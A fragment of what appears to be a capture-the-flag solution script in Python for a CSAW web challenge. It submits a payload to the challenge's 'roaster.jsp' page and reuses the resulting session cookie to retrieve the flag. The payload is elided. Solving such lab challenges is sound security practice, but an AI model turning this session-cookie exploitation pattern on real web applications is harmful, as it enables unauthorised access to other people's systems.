...
def get_flag(c):
    r = requests.get('http://web.chal.csaw.io:8616/', cookies = {'JSESSIONID': c})
...
def breed_bean(payload):
    ...
    s = requests.Session()
    r = s.get('http://web.chal.csaw.io:8616/breed.jsp')
    c = r.cookies['JSESSIONID']
    r = s.post('http://web.chal.csaw.io:8616/roaster.jsp', params = data)
    return c
